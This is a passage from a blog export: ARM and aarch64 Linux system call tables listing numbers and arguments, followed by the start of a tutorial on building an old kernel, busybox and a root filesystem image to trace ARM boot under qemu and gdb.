0xf3 unsigned nr_reqs aio_context_t *ctx - 244 io_destroy 0xf4 aio_context_t ctx - - 245 io_getevents 0xf5 aio_context_t ctx_id long min_nr long nr 246 io_submit 0xf6 aio_context_t long struct iocb 247 io_cancel 0xf7 aio_context_t ctx_id struct iocb *iocb struct io_event *result 248 exit_group 0xf8 int error_code - - 249 lookup_dcookie 0xf9 u64 cookie64 char *buf size_t len 250 epoll_create 0xfa int size - - 251 epoll_ctl 0xfb int epfd int op int fd 252 epoll_wait 0xfc int epfd struct epoll_event *events int maxevents 253 remap_file_pages 0xfd unsigned long start unsigned long size unsigned long prot 254 not implemented 0xfe 255 not implemented 0xff 256 set_tid_address 0x100 int *tidptr - - 257 timer_create 0x101 clockid_t which_clock struct sigevent *timer_event_spec timer_t * created_timer_id 258 timer_settime 0x102 timer_t timer_id int flags const struct __kernel_itimerspec *new_setting 259 timer_gettime 0x103 timer_t timer_id struct __kernel_itimerspec *setting - 260 timer_getoverrun 0x104 timer_t timer_id - - 261 timer_delete 0x105 timer_t timer_id - - 262 clock_settime 0x106 clockid_t which_clock const struct __kernel_timespec *tp - 263 clock_gettime 0x107 clockid_t which_clock struct __kernel_timespec *tp - 264 clock_getres 0x108 clockid_t which_clock struct __kernel_timespec *tp - 265 clock_nanosleep 0x109 clockid_t which_clock int flags const struct __kernel_timespec *rqtp 266 statfs64 0x10a const char *path size_t sz struct statfs64 *buf 267 fstatfs64 0x10b unsigned int fd size_t sz struct statfs64 *buf 268 tgkill 0x10c pid_t tgid pid_t pid int sig 269 utimes 0x10d char *filename struct __kernel_old_timeval *utimes - 270 arm_fadvise64_64 0x10e ? ? ? 271 pciconfig_iobase 0x10f long which unsigned long bus unsigned long devfn 272 pciconfig_read 0x110 unsigned long bus unsigned long dfn unsigned long off 273 pciconfig_write 0x111 unsigned long bus unsigned long dfn unsigned long off 274 mq_open 0x112 const char *name int oflag umode_t mode 275 mq_unlink 0x113 const char *name - - 276 mq_timedsend 0x114 mqd_t mqdes const char *msg_ptr size_t msg_len 277 mq_timedreceive 0x115 mqd_t mqdes char *msg_ptr size_t msg_len 278 mq_notify 0x116 mqd_t mqdes const struct sigevent *notification - 279 mq_getsetattr 0x117 mqd_t mqdes const struct mq_attr *mqstat struct mq_attr *omqstat 280 waitid 0x118 int which pid_t pid struct siginfo *infop 281 socket 0x119 int int int 282 bind 0x11a int struct sockaddr * int 283 connect 0x11b int struct sockaddr * int 284 listen 0x11c int int - 285 accept 0x11d int struct sockaddr * int * 286 getsockname 0x11e int struct sockaddr * int * 287 getpeername 0x11f int struct sockaddr * int * 288 socketpair 0x120 int int int 289 send 0x121 int void * size_t 290 sendto 0x122 int void * size_t 291 recv 0x123 int void * size_t 292 recvfrom 0x124 int void * size_t 293 shutdown 0x125 int int - 294 setsockopt 0x126 int fd int level int optname 295 getsockopt 0x127 int fd int level int optname 296 sendmsg 0x128 int fd struct user_msghdr *msg unsigned flags 297 recvmsg 0x129 int fd struct user_msghdr *msg unsigned flags 298 semop 0x12a int semid struct sembuf *sops unsigned nsops 299 semget 0x12b key_t key int nsems int semflg 300 semctl 0x12c int semid int semnum int cmd 301 msgsnd 0x12d int msqid struct msgbuf *msgp size_t msgsz 302 msgrcv 0x12e int msqid struct msgbuf *msgp size_t msgsz 303 msgget 0x12f key_t key int msgflg - 304 msgctl 0x130 int msqid int cmd struct msqid_ds *buf 305 shmat 0x131 int shmid char *shmaddr int shmflg 306 shmdt 0x132 char *shmaddr - - 307 shmget 0x133 key_t key size_t size int flag 308 shmctl 0x134 int shmid int cmd struct shmid_ds *buf 309 add_key 0x135 const char *_type const char *_description const void *_payload 310 request_key 0x136 const char *_type const char *_description const char *_callout_info 311 keyctl 0x137 int cmd unsigned long arg2 unsigned long arg3 312 semtimedop 0x138 int semid struct sembuf *sops unsigned nsops 313 vserver 0x139 ? ? ? 314 ioprio_set 0x13a int which int who int ioprio 315 ioprio_get 0x13b int which int who - 316 inotify_init 0x13c - - - 317 inotify_add_watch 0x13d int fd const char *path u32 mask 318 inotify_rm_watch 0x13e int fd __s32 wd - 319 mbind 0x13f unsigned long start unsigned long len unsigned long mode 320 get_mempolicy 0x140 int *policy unsigned long *nmask unsigned long maxnode 321 set_mempolicy 0x141 int mode const unsigned long *nmask unsigned long maxnode 322 openat 0x142 int dfd const char *filename int flags 323 mkdirat 0x143 int dfd const char * pathname umode_t mode 324 mknodat 0x144 int dfd const char * filename umode_t mode 325 fchownat 0x145 int dfd const char *filename uid_t user 326 futimesat 0x146 int dfd const char *filename struct __kernel_old_timeval *utimes 327 fstatat64 0x147 int dfd const char *filename struct stat64 *statbuf 328 unlinkat 0x148 int dfd const char * pathname int flag 329 renameat 0x149 int olddfd const char * oldname int newdfd 330 linkat 0x14a int olddfd const char *oldname int newdfd 331 symlinkat 0x14b const char * oldname int newdfd const char * newname 332 readlinkat 0x14c int dfd const char *path char *buf 333 fchmodat 0x14d int dfd const char * filename umode_t mode 334 faccessat 0x14e int dfd const char *filename int mode 335 pselect6 0x14f int fd_set * fd_set * 336 ppoll 0x150 struct pollfd * unsigned int struct __kernel_timespec * 337 unshare 0x151 unsigned long unshare_flags - - 338 set_robust_list 0x152 struct robust_list_head *head size_t len - 339 get_robust_list 0x153 int pid struct robust_list_head head_ptr size_t *len_ptr 340 splice 0x154 int fd_in loff_t *off_in int fd_out 341 arm_sync_file_range 0x155 ? ? ? 341 sync_file_range2 0x155 int fd unsigned int flags loff_t offset 342 tee 0x156 int fdin int fdout size_t len 343 vmsplice 0x157 int fd const struct iovec *iov unsigned long nr_segs 344 move_pages 0x158 pid_t pid unsigned long nr_pages const void pages 345 getcpu 0x159 unsigned *cpu unsigned *node struct getcpu_cache *cache 346 epoll_pwait 0x15a int epfd struct epoll_event *events int maxevents 347 kexec_load 0x15b unsigned long entry unsigned long nr_segments struct kexec_segment *segments 348 utimensat 0x15c int dfd const char *filename struct __kernel_timespec *utimes 349 signalfd 0x15d int ufd sigset_t *user_mask size_t sizemask 350 timerfd_create 0x15e int clockid int flags - 351 eventfd 0x15f unsigned int count - - 352 fallocate 0x160 int fd int mode loff_t offset 353 timerfd_settime 0x161 int ufd int flags const struct __kernel_itimerspec *utmr 354 timerfd_gettime 0x162 int ufd struct __kernel_itimerspec *otmr - 355 signalfd4 0x163 int ufd sigset_t *user_mask size_t sizemask 356 eventfd2 0x164 unsigned int count int flags - 357 epoll_create1 0x165 int flags - - 358 dup3 0x166 unsigned int oldfd unsigned int newfd int flags 359 pipe2 0x167 int *fildes int flags - 360 inotify_init1 0x168 int flags - - 361 preadv 0x169 unsigned long fd const struct iovec *vec unsigned long vlen 362 pwritev 0x16a unsigned long fd const struct iovec *vec unsigned long vlen 363 rt_tgsigqueueinfo 0x16b pid_t tgid pid_t pid int sig 364 perf_event_open 0x16c struct perf_event_attr *attr_uptr pid_t pid int cpu 365 recvmmsg 0x16d int fd struct mmsghdr *msg unsigned int vlen 366 accept4 0x16e int struct sockaddr * int * 367 fanotify_init 0x16f unsigned int flags unsigned int event_f_flags - 368 fanotify_mark 0x170 int fanotify_fd unsigned int flags u64 mask 369 prlimit64 0x171 pid_t pid unsigned int resource const struct rlimit64 *new_rlim 370 name_to_handle_at 0x172 int dfd const char *name struct file_handle *handle 371 open_by_handle_at 0x173 int mountdirfd struct file_handle *handle int flags 372 clock_adjtime 0x174 clockid_t which_clock struct __kernel_timex *tx - 373 syncfs 0x175 int fd - - 374 sendmmsg 0x176 int fd struct mmsghdr *msg unsigned int vlen 375 setns 0x177 int fd int nstype - 376 process_vm_readv 0x178 pid_t pid const struct iovec *lvec unsigned long liovcnt 377 process_vm_writev 0x179 pid_t pid const struct iovec *lvec unsigned long liovcnt 378 kcmp 0x17a pid_t pid1 pid_t pid2 int type 379 finit_module 0x17b int fd const char *uargs int flags 380 sched_setattr 0x17c pid_t pid struct sched_attr *attr unsigned int flags 381 sched_getattr 0x17d pid_t pid struct sched_attr *attr unsigned int size 382 renameat2 0x17e int olddfd const char *oldname int newdfd 383 seccomp 0x17f unsigned int op unsigned int flags void *uargs 384 getrandom 0x180 char *buf size_t count unsigned int flags 385 memfd_create 0x181 const char *uname_ptr unsigned int flags - 386 bpf 0x182 int cmd union bpf_attr *attr unsigned int size 387 execveat 0x183 int dfd const char *filename const char *const *argv 388 userfaultfd 0x184 int flags - - 389 membarrier 0x185 int cmd unsigned int flags int cpu_id 390 mlock2 0x186 unsigned long start size_t len int flags 391 copy_file_range 0x187 int fd_in loff_t *off_in int fd_out 392 preadv2 0x188 unsigned long fd const struct iovec *vec unsigned long vlen 393 pwritev2 0x189 unsigned long fd const struct iovec *vec unsigned long vlen 394 pkey_mprotect 0x18a unsigned long start size_t len unsigned long prot 395 pkey_alloc 0x18b unsigned long flags unsigned long init_val - 396 pkey_free 0x18c int pkey - - 397 statx 0x18d int dfd const char *path unsigned flags 398 not implemented 0x18e 399 not implemented 0x18f 400 not implemented 0x190 401 not implemented 0x191 402 not implemented 0x192 403 clock_gettime64 0x193 ? ? ? 404 clock_settime64 0x194 ? ? ? 405 clock_adjtime64 0x195 ? ? ? 406 clock_getres_time64 0x196 ? ? ? 407 clock_nanosleep_time64 0x197 ? ? ? 408 timer_gettime64 0x198 ? ? ? 409 timer_settime64 0x199 ? ? ? 410 timerfd_gettime64 0x19a ? ? ? 411 timerfd_settime64 0x19b ? ? ? 412 utimensat_time64 0x19c ? ? ? 413 pselect6_time64 0x19d ? ? ? 414 ppoll_time64 0x19e ? ? ? 415 not implemented 0x19f 416 io_pgetevents_time64 0x1a0 ? ? ? 417 recvmmsg_time64 0x1a1 ? ? ? 418 mq_timedsend_time64 0x1a2 ? ? ? 419 mq_timedreceive_time64 0x1a3 ? ? ? 420 semtimedop_time64 0x1a4 ? ? ? 421 rt_sigtimedwait_time64 0x1a5 ? ? ? 422 futex_time64 0x1a6 ? ? ? 423 sched_rr_get_interval_time64 0x1a7 ? ? ? 424 not implemented 0x1a8 425 io_uring_setup 0x1a9 u32 entries struct io_uring_params *p - 426 io_uring_enter 0x1aa unsigned int fd u32 to_submit u32 min_complete 427 not implemented 0x1ab 428 not implemented 0x1ac 429 not implemented 0x1ad 430 not implemented 0x1ae 431 not implemented 0x1af 432 not implemented 0x1b0 433 not implemented 0x1b1 434 not implemented 0x1b2 435 not implemented 0x1b3 436 not implemented 0x1b4 437 not implemented 0x1b5 438 not implemented 0x1b6 439 faccessat2 0x1b7 int dfd const char *filename int mode 983041 ARM_breakpoint 0xf0001 ? ? ? 983042 ARM_cacheflush 0xf0002 ? ? ? 983043 ARM_usr26 0xf0003 ? ? ? 983044 ARM_usr32 0xf0004 ? ? ? 983045 ARM_set_tls 0xf0005 ? ? ? aarch64ç³»ç»Ÿè°ƒç”¨è¡¨ NR syscall name %x8 arg0 (%x0) arg1 (%x1) arg2 (%x2) 0 io_setup 0x00 unsigned nr_reqs aio_context_t *ctx - 1 io_destroy 0x01 aio_context_t ctx - - 2 io_submit 0x02 aio_context_t long struct iocb 3 io_cancel 0x03 aio_context_t ctx_id struct iocb *iocb struct io_event *result 4 io_getevents 0x04 aio_context_t ctx_id long min_nr long nr 5 setxattr 0x05 const char *path const char *name const void *value 6 lsetxattr 0x06 const char *path const char *name const void *value 7 fsetxattr 0x07 int fd const char *name const void *value 8 getxattr 0x08 const char *path const char *name void *value 9 lgetxattr 0x09 const char *path const char *name void *value 10 fgetxattr 0x0a int fd const char *name void *value 11 listxattr 0x0b const char *path char *list size_t size 12 llistxattr 0x0c const char *path char *list size_t size 13 flistxattr 0x0d int fd char *list size_t size 14 removexattr 0x0e const char *path const char *name - 15 lremovexattr 0x0f const char *path const char *name - 16 fremovexattr 0x10 int fd const char *name - 17 getcwd 0x11 char *buf unsigned long size - 18 lookup_dcookie 0x12 u64 cookie64 char *buf size_t len 19 eventfd2 0x13 unsigned int count int flags - 20 epoll_create1 0x14 int flags - - 21 epoll_ctl 0x15 int epfd int op int fd 22 epoll_pwait 0x16 int epfd struct epoll_event *events int maxevents 23 dup 0x17 unsigned int fildes - - 24 dup3 0x18 unsigned int oldfd unsigned int newfd int flags 25 fcntl 0x19 unsigned int fd unsigned int cmd unsigned long arg 26 inotify_init1 0x1a int flags - - 27 inotify_add_watch 0x1b int fd const char *path u32 mask 28 inotify_rm_watch 0x1c int fd __s32 wd - 29 ioctl 0x1d unsigned int fd unsigned int cmd unsigned long arg 30 ioprio_set 0x1e int which int who int ioprio 31 ioprio_get 0x1f int which int who - 32 flock 0x20 unsigned int fd unsigned int cmd - 33 mknodat 0x21 int dfd const char * filename umode_t mode 34 mkdirat 0x22 int dfd const char * pathname umode_t mode 35 unlinkat 0x23 int dfd const char * pathname int flag 36 symlinkat 0x24 const char * oldname int newdfd const char * newname 37 linkat 0x25 int olddfd const char *oldname int newdfd 38 renameat 0x26 int olddfd const char * oldname int newdfd 39 umount2 0x27 ? ? ? 40 mount 0x28 char *dev_name char *dir_name char *type 41 pivot_root 0x29 const char *new_root const char *put_old - 42 nfsservctl 0x2a ? ? ? 43 statfs 0x2b const char * path struct statfs *buf - 44 fstatfs 0x2c unsigned int fd struct statfs *buf - 45 truncate 0x2d const char *path long length - 46 ftruncate 0x2e unsigned int fd unsigned long length - 47 fallocate 0x2f int fd int mode loff_t offset 48 faccessat 0x30 int dfd const char *filename int mode 49 chdir 0x31 const char *filename - - 50 fchdir 0x32 unsigned int fd - - 51 chroot 0x33 const char *filename - - 52 fchmod 0x34 unsigned int fd umode_t mode - 53 fchmodat 0x35 int dfd const char * filename umode_t mode 54 fchownat 0x36 int dfd const char *filename uid_t user 55 fchown 0x37 unsigned int fd uid_t user gid_t group 56 openat 0x38 int dfd const char *filename int flags 57 close 0x39 unsigned int fd - - 58 vhangup 0x3a - - - 59 pipe2 0x3b int *fildes int flags - 60 quotactl 0x3c unsigned int cmd const char *special qid_t id 61 getdents64 0x3d unsigned int fd struct linux_dirent64 *dirent unsigned int count 62 lseek 0x3e unsigned int fd off_t offset unsigned int whence 63 read 0x3f unsigned int fd char *buf size_t count 64 write 0x40 unsigned int fd const char *buf size_t count 65 readv 0x41 unsigned long fd const struct iovec *vec unsigned long vlen 66 writev 0x42 unsigned long fd const struct iovec *vec unsigned long vlen 67 pread64 0x43 unsigned int fd char *buf size_t count 68 pwrite64 0x44 unsigned int fd const char *buf size_t count 69 preadv 0x45 unsigned long fd const struct iovec *vec unsigned long vlen 70 pwritev 0x46 unsigned long fd const struct iovec *vec unsigned long vlen 71 sendfile 0x47 int out_fd int in_fd off_t *offset 72 pselect6 0x48 int fd_set * fd_set * 73 ppoll 0x49 struct pollfd * unsigned int struct __kernel_timespec * 74 signalfd4 0x4a int ufd sigset_t *user_mask size_t sizemask 75 vmsplice 0x4b int fd const struct iovec *iov unsigned long nr_segs 76 splice 0x4c int fd_in loff_t *off_in int fd_out 77 tee 0x4d int fdin int fdout size_t len 78 readlinkat 0x4e int dfd const char *path char *buf 79 newfstatat 0x4f int dfd const char *filename struct stat *statbuf 80 fstat 0x50 unsigned int fd struct __old_kernel_stat *statbuf - 81 sync 0x51 - - - 82 fsync 0x52 unsigned int fd - - 83 fdatasync 0x53 unsigned int fd - - 84 sync_file_range 0x54 int fd loff_t offset loff_t nbytes 85 timerfd_create 0x55 int clockid int flags - 86 timerfd_settime 0x56 int ufd int flags const struct __kernel_itimerspec *utmr 87 timerfd_gettime 0x57 int ufd struct __kernel_itimerspec *otmr - 88 utimensat 0x58 int dfd const char *filename struct __kernel_timespec *utimes 89 acct 0x59 const char *name - - 90 capget 0x5a cap_user_header_t header cap_user_data_t dataptr - 91 capset 0x5b cap_user_header_t header const cap_user_data_t data - 92 personality 0x5c unsigned int personality - - 93 exit 0x5d int error_code - - 94 exit_group 0x5e int error_code - - 95 waitid 0x5f int which pid_t pid struct siginfo *infop 96 set_tid_address 0x60 int *tidptr - - 97 unshare 0x61 unsigned long unshare_flags - - 98 futex 0x62 u32 *uaddr int op u32 val 99 set_robust_list 0x63 struct robust_list_head *head size_t len - 100 get_robust_list 0x64 int pid struct robust_list_head head_ptr size_t *len_ptr 101 nanosleep 0x65 struct __kernel_timespec *rqtp struct __kernel_timespec *rmtp - 102 getitimer 0x66 int which struct __kernel_old_itimerval *value - 103 setitimer 0x67 int which struct __kernel_old_itimerval *value struct __kernel_old_itimerval *ovalue 104 kexec_load 0x68 unsigned long entry unsigned long nr_segments struct kexec_segment *segments 105 init_module 0x69 void *umod unsigned long len const char *uargs 106 delete_module 0x6a const char *name_user unsigned int flags - 107 timer_create 0x6b clockid_t which_clock struct sigevent *timer_event_spec timer_t * created_timer_id 108 timer_gettime 0x6c timer_t timer_id struct __kernel_itimerspec *setting - 109 timer_getoverrun 0x6d timer_t timer_id - - 110 timer_settime 0x6e timer_t timer_id int flags const struct __kernel_itimerspec *new_setting 111 timer_delete 0x6f timer_t timer_id - - 112 clock_settime 0x70 clockid_t which_clock const struct __kernel_timespec *tp - 113 clock_gettime 0x71 clockid_t which_clock struct __kernel_timespec *tp - 114 clock_getres 0x72 clockid_t which_clock struct __kernel_timespec *tp - 115 clock_nanosleep 0x73 clockid_t which_clock int flags const struct __kernel_timespec *rqtp 116 syslog 0x74 int type char *buf int len 117 ptrace 0x75 long request long pid unsigned long addr 118 sched_setparam 0x76 pid_t pid struct sched_param *param - 119 sched_setscheduler 0x77 pid_t pid int policy struct sched_param *param 120 sched_getscheduler 0x78 pid_t pid - - 121 sched_getparam 0x79 pid_t pid struct sched_param *param - 122 sched_setaffinity 0x7a pid_t pid unsigned int len unsigned long *user_mask_ptr 123 sched_getaffinity 0x7b pid_t pid unsigned int len unsigned long *user_mask_ptr 124 sched_yield 0x7c - - - 125 sched_get_priority_max 0x7d int policy - - 126 sched_get_priority_min 0x7e int policy - - 127 sched_rr_get_interval 0x7f pid_t pid struct __kernel_timespec *interval - 128 restart_syscall 0x80 - - - 129 kill 0x81 pid_t pid int sig - 130 tkill 0x82 pid_t pid int sig - 131 tgkill 0x83 pid_t tgid pid_t pid int sig 132 sigaltstack 0x84 const struct sigaltstack *uss struct sigaltstack *uoss - 133 rt_sigsuspend 0x85 sigset_t *unewset size_t sigsetsize - 134 rt_sigaction 0x86 int const struct sigaction * struct sigaction * 135 rt_sigprocmask 0x87 int how sigset_t *set sigset_t *oset 136 rt_sigpending 0x88 sigset_t *set size_t sigsetsize - 137 rt_sigtimedwait 0x89 const sigset_t *uthese siginfo_t *uinfo const struct __kernel_timespec *uts 138 rt_sigqueueinfo 0x8a pid_t pid int sig siginfo_t *uinfo 139 rt_sigreturn 0x8b ? ? ? 140 setpriority 0x8c int which int who int niceval 141 getpriority 0x8d int which int who - 142 reboot 0x8e int magic1 int magic2 unsigned int cmd 143 setregid 0x8f gid_t rgid gid_t egid - 144 setgid 0x90 gid_t gid - - 145 setreuid 0x91 uid_t ruid uid_t euid - 146 setuid 0x92 uid_t uid - - 147 setresuid 0x93 uid_t ruid uid_t euid uid_t suid 148 getresuid 0x94 uid_t *ruid uid_t *euid uid_t *suid 149 setresgid 0x95 gid_t rgid gid_t egid gid_t sgid 150 getresgid 0x96 gid_t *rgid gid_t *egid gid_t *sgid 151 setfsuid 0x97 uid_t uid - - 152 setfsgid 0x98 gid_t gid - - 153 times 0x99 struct tms *tbuf - - 154 setpgid 0x9a pid_t pid pid_t pgid - 155 getpgid 0x9b pid_t pid - - 156 getsid 0x9c pid_t pid - - 157 setsid 0x9d - - - 158 getgroups 0x9e int gidsetsize gid_t *grouplist - 159 setgroups 0x9f int gidsetsize gid_t *grouplist - 160 uname 0xa0 struct old_utsname * - - 161 sethostname 0xa1 char *name int len - 162 setdomainname 0xa2 char *name int len - 163 getrlimit 0xa3 unsigned int resource struct rlimit *rlim - 164 setrlimit 0xa4 unsigned int resource struct rlimit *rlim - 165 getrusage 0xa5 int who struct rusage *ru - 166 umask 0xa6 int mask - - 167 prctl 0xa7 int option unsigned long arg2 unsigned long arg3 168 getcpu 0xa8 unsigned *cpu unsigned *node struct getcpu_cache *cache 169 gettimeofday 0xa9 struct __kernel_old_timeval *tv struct timezone *tz - 170 settimeofday 0xaa struct __kernel_old_timeval *tv struct timezone *tz - 171 adjtimex 0xab struct __kernel_timex *txc_p - - 172 getpid 0xac - - - 173 getppid 0xad - - - 174 getuid 0xae - - - 175 geteuid 0xaf - - - 176 getgid 0xb0 - - - 177 getegid 0xb1 - - - 178 gettid 0xb2 - - - 179 sysinfo 0xb3 struct sysinfo *info - - 180 mq_open 0xb4 const char *name int oflag umode_t mode 181 mq_unlink 0xb5 const char *name - - 182 mq_timedsend 0xb6 mqd_t mqdes const char *msg_ptr size_t msg_len 183 mq_timedreceive 0xb7 mqd_t mqdes char *msg_ptr size_t msg_len 184 mq_notify 0xb8 mqd_t mqdes const struct sigevent *notification - 185 mq_getsetattr 0xb9 mqd_t mqdes const struct mq_attr *mqstat struct mq_attr *omqstat 186 msgget 0xba key_t key int msgflg - 187 msgctl 0xbb int msqid int cmd struct msqid_ds *buf 188 msgrcv 0xbc int msqid struct msgbuf *msgp size_t msgsz 189 msgsnd 0xbd int msqid struct msgbuf *msgp size_t msgsz 190 semget 0xbe key_t key int nsems int semflg 191 semctl 0xbf int semid int semnum int cmd 192 semtimedop 0xc0 int semid struct sembuf *sops unsigned nsops 193 semop 0xc1 int semid struct sembuf *sops unsigned nsops 194 shmget 0xc2 key_t key size_t size int flag 195 shmctl 0xc3 int shmid int cmd struct shmid_ds *buf 196 shmat 0xc4 int shmid char *shmaddr int shmflg 197 shmdt 0xc5 char *shmaddr - - 198 socket 0xc6 int int int 199 socketpair 0xc7 int int int 200 bind 0xc8 int struct sockaddr * int 201 listen 0xc9 int int - 202 accept 0xca int struct sockaddr * int * 203 connect 0xcb int struct sockaddr * int 204 getsockname 0xcc int struct sockaddr * int * 205 getpeername 0xcd int struct sockaddr * int * 206 sendto 0xce int void * size_t 207 recvfrom 0xcf int void * size_t 208 setsockopt 0xd0 int fd int level int optname 209 getsockopt 0xd1 int fd int level int optname 210 shutdown 0xd2 int int - 211 sendmsg 0xd3 int fd struct user_msghdr *msg unsigned flags 212 recvmsg 0xd4 int fd struct user_msghdr *msg unsigned flags 213 readahead 0xd5 int fd loff_t offset size_t count 214 brk 0xd6 unsigned long brk - - 215 munmap 0xd7 unsigned long addr size_t len - 216 mremap 0xd8 unsigned long addr unsigned long old_len unsigned long new_len 217 add_key 0xd9 const char *_type const char *_description const void *_payload 218 request_key 0xda const char *_type const char *_description const char *_callout_info 219 keyctl 0xdb int cmd unsigned long arg2 unsigned long arg3 220 clone 0xdc unsigned long unsigned long int * 221 execve 0xdd const char *filename const char *const *argv const char *const *envp 222 mmap 0xde ? ? ? 223 fadvise64 0xdf int fd loff_t offset size_t len 224 swapon 0xe0 const char *specialfile int swap_flags - 225 swapoff 0xe1 const char *specialfile - - 226 mprotect 0xe2 unsigned long start size_t len unsigned long prot 227 msync 0xe3 unsigned long start size_t len int flags 228 mlock 0xe4 unsigned long start size_t len - 229 munlock 0xe5 unsigned long start size_t len - 230 mlockall 0xe6 int flags - - 231 munlockall 0xe7 - - - 232 mincore 0xe8 unsigned long start size_t len unsigned char * vec 233 madvise 0xe9 unsigned long start size_t len int behavior 234 remap_file_pages 0xea unsigned long start unsigned long size unsigned long prot 235 mbind 0xeb unsigned long start unsigned long len unsigned long mode 236 get_mempolicy 0xec int *policy unsigned long *nmask unsigned long maxnode 237 set_mempolicy 0xed int mode const unsigned long *nmask unsigned long maxnode 238 migrate_pages 0xee pid_t pid unsigned long maxnode const unsigned long *from 239 move_pages 0xef pid_t pid unsigned long nr_pages const void pages 240 rt_tgsigqueueinfo 0xf0 pid_t tgid pid_t pid int sig 241 perf_event_open 0xf1 struct perf_event_attr *attr_uptr pid_t pid int cpu 242 accept4 0xf2 int struct sockaddr * int * 243 recvmmsg 0xf3 int fd struct mmsghdr *msg unsigned int vlen 244 not implemented 0xf4 245 not implemented 0xf5 246 not implemented 0xf6 247 not implemented 0xf7 248 not implemented 0xf8 249 not implemented 0xf9 250 not implemented 0xfa 251 not implemented 0xfb 252 not implemented 0xfc 253 not implemented 0xfd 254 not implemented 0xfe 255 not implemented 0xff 256 not implemented 0x100 257 not implemented 0x101 258 not implemented 0x102 259 not implemented 0x103 260 wait4 0x104 pid_t pid int *stat_addr int options 261 prlimit64 0x105 pid_t pid unsigned int resource const struct rlimit64 *new_rlim 262 fanotify_init 0x106 unsigned int flags unsigned int event_f_flags - 263 fanotify_mark 0x107 int fanotify_fd unsigned int flags u64 mask 264 name_to_handle_at 0x108 int dfd const char *name struct file_handle *handle 265 open_by_handle_at 0x109 int mountdirfd struct file_handle *handle int flags 266 clock_adjtime 0x10a clockid_t which_clock struct __kernel_timex *tx - 267 syncfs 0x10b int fd - - 268 setns 0x10c int fd int nstype - 269 sendmmsg 0x10d int fd struct mmsghdr *msg unsigned int vlen 270 process_vm_readv 0x10e pid_t pid const struct iovec *lvec unsigned long liovcnt 271 process_vm_writev 0x10f pid_t pid const struct iovec *lvec unsigned long liovcnt 272 kcmp 0x110 pid_t pid1 pid_t pid2 int type 273 finit_module 0x111 int fd const char *uargs int flags 274 sched_setattr 0x112 pid_t pid struct sched_attr *attr unsigned int flags 275 sched_getattr 0x113 pid_t pid struct sched_attr *attr unsigned int size 276 renameat2 0x114 int olddfd const char *oldname int newdfd 277 seccomp 0x115 unsigned int op unsigned int flags void *uargs 278 getrandom 0x116 char *buf size_t count unsigned int flags 279 memfd_create 0x117 const char *uname_ptr unsigned int flags - 280 bpf 0x118 int cmd union bpf_attr *attr unsigned int size 281 execveat 0x119 int dfd const char *filename const char *const *argv 282 userfaultfd 0x11a int flags - - 283 membarrier 0x11b int cmd unsigned int flags int cpu_id 284 mlock2 0x11c unsigned long start size_t len int flags 285 copy_file_range 0x11d int fd_in loff_t *off_in int fd_out 286 preadv2 0x11e unsigned long fd const struct iovec *vec unsigned long vlen 287 pwritev2 0x11f unsigned long fd const struct iovec *vec unsigned long vlen 288 pkey_mprotect 0x120 unsigned long start size_t len unsigned long prot 289 pkey_alloc 0x121 unsigned long flags unsigned long init_val - 290 pkey_free 0x122 int pkey - - 291 statx 0x123 int dfd const char *path unsigned flags 425 io_uring_setup 0x1a9 u32 entries struct io_uring_params *p - 426 io_uring_enter 0x1aa unsigned int fd u32 to_submit u32 min_complete 427 not implemented 0x1ab 428 not implemented 0x1ac 429 not implemented 0x1ad 430 not implemented 0x1ae 431 not implemented 0x1af 432 not implemented 0x1b0 433 not implemented 0x1b1 434 not implemented 0x1b2 435 not implemented 0x1b3 436 not implemented 0x1b4 437 not implemented 0x1b5 438 not implemented 0x1b6 439 faccessat2 0x1b7 int dfd const char *filename int mode ","date":"2022-05-08T21:45:00+08:00","image":"https://s2.loli.net/2022/05/08/1vXerd2a3qCgcfQ.jpg","permalink":"https://cerr.cc/post/linux%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%A4%A7%E5%85%A8/","title":"Linuxç³»ç»Ÿè°ƒç”¨å¤§å…¨"},{"content":" From this post, our goal is tracing the execution procedure from kernel entry to userspace process (busybox init) by using qemu-system and gdb-multiarch.\nPreparation qemu-system-arm Compile it from source code or just use sudo apt install qemu-system-arm.\nkernel Linux kernel v4.1 for armel as an example. Compiling a linux kernel requires a matched version of gcc. For example, the linux kernel v4.1 requires the gcc version between 3 and 5:\n1 2 3 4 5 linunx-v4.1 $ find . -name \u0026#34;compiler-gcc*.h\u0026#34; ./include/linux/compiler-gcc.h ./include/linux/compiler-gcc3.h ./include/linux/compiler-gcc4.h ./include/linux/compiler-gcc5.h So how can we get the old version gcc? You can always rely on buildroot: https://buildroot.org/download.html\nJust clone it\u0026rsquo;s repository:\n1 git clone https://git.buildroot.net/buildroot And switch to the specific old release you required. You can check gcc release history from here\nGCC5 is released in 2015, so we switch buildroot\u0026rsquo;s release version to 2015.08.x :\n1 git switch 2015.08.x And then,\n1 2 3 make menuconfig # edit with yourself make But an error occured in this step (this because we are using an old version of buildroot) :\nerror \u0026ldquo;Please port gnulib freadahead.c to your platform!\ncd to /buildroot/output/build/host-m4-1.4.17 and excute :\n1 2 sed -i \u0026#39;s/IO_ftrylockfile/IO_EOF_SEEN/\u0026#39; lib/*.c echo \u0026#34;#define _IO_IN_BACKUP 0x100\u0026#34; \u0026gt;\u0026gt; lib/stdio-impl.h Then make again, we will get the old version of GCC we want. Ready for compiling the old version linux kernel :)\n1 2 3 git clone https://github.com/torvalds/linux.git git checkout v4.1 make ARCH=arm O=./build/armel menuconfig Make sure that CONFIG_DEBUG_INFO is enabled. (You can configure it in the .config file directly, or in kernel-hack item from menuconfig interface.)\n1 make ARCH=arm O=./build/armel CROSS_COMPILE=/opt/crossc/armel-uclibc-gcc-4/usr/bin/arm-buildroot-linux-uclibcgnueabi- zImage -j$(nproc) We got zImage at build/armel/arch/arm/boot/zImage and vmlinux (with debug symbols) at build/armel\nbusybox Even though we can use the busybox from the filesystem directly, we got no debug symbols from it. Thus we should compile busybox manually:\n1 2 3 git clone https://git.busybox.net/busybox/ make menuconfig make CROSS_COMPILE=/opt/crossc/armel-uclibc-gcc-4/usr/bin/arm-buildroot-linux-uclibcgnueabi- -j$(nproc) Then the busybox_unstripped is produced.\nfilesystem Hummm maybe obtain it by yourself?\nAs for my situation, I just extract the filesystem from a TP-Link firmware. And we need do some modification to turn our filesystem directory to a filesystem image. Assume we have the rootfs directory made by bin etc sys usr var tmp \u0026hellip; First of all, use dd to create a 50MB file filled with \\x00\n1 dd if=/dev/zero of=rootfs.img bs=4k count=12800 We will regard this rootfs.img as our virtual disk containing root filesystem. So, continue modifing it. The next step is create disk partitions using fdisk on rootfs.img :\n1 echo -e 